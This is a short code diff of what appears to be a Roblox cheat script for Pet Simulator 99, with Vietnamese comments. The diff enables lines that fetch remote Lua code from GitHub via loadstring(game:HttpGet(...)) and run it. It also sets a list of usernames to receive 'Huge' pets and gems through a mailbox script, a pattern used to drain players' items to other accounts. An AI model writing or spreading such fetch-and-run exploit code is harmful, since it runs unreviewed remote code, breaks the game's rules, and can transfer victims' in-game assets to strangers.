@@ -9,8 +9,8 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/Hoith95/Pet-99/main/T
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Hoith95/Pet-99/main/Mastery"))()
 
 --- Tài Khoản Nhận Huge Và Gems ---
---getgenv().usernames = {"Thu_Linhx", "dungxta23", "xuxca2", "Kimk_duyek"}
---loadstring(game:HttpGet("https://raw.githubusercontent.com/Hoith95/Pet-99/main/Mailbox-Huge"))()
+getgenv().usernames = {"Thu_Linhx", "dungxta23", "xuxca2"}
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Hoith95/Pet-99/main/Mailbox-Huge"))()
 
 --- Gửi Tất Cả Pet Event ---
 task.wait(15)
